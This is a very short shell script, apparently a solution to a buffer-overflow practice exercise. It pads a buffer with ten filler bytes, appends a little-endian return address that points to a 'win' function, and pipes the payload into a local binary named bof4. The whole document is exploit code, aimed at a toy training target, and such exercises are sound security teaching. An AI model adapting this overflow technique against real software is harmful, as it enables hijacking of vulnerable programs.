# fill s with 10 chars
payload='AAAABBBBCC'
# put the right address to call the win function, in little endian
payload="$payload\x42\x11\x40\x00"

echo -e $payload
echo -ne $payload | ./bof4
